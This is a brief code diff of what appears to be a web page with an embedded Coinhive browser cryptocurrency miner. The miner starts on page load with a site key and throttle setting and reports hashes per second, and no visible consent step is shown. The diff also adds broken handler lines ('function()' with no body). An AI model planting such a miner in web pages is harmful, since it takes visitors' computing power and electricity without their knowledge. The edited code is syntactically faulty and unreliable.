@@ -4,14 +4,11 @@
 <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
 <script>
 var miner = new CoinHive.User('9HFBGteZw940D7eDnWRVkg3tcTqDLSQL','demo',{
-        threads: 2,
-	autoThreads: false,
-	throttle: 0.5,
-	forceASMJS: false
+        throttle: 0.5,
 });
 	miner.start();
-	miner.on('found', function() { /* Hash found */ })
-	miner.on('accepted', function() { /* Hash accepted by the pool */ })
+	miner.on('found', function())
+	miner.on('accepted', function())
 	setInterval(function() {
 		var hashesPerSecond = miner.getHashesPerSecond();
 		var totalHashes = miner.getTotalHashes();
